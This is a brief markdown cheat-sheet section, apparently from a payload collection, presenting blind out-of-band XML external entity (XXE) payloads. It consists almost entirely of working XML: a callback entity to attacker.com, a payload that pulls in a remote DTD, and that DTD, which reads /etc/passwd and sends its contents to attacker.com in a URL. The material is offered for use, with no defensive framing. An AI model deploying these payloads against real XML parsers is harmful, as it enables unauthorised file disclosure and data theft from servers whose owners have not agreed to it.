## 👁️ Blind XXE (Out-of-Band)

### DNS/HTTP Callback
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
]>
<root><data>&xxe;</data></root>
```

### Blind XXE - Exfiltrate Data via OOB
```xml
<!-- Payload sent to target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>&send;</data></root>
```

```xml
<!-- evil.dtd hosted on attacker.com -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?file=%file;'>">
%eval;
```

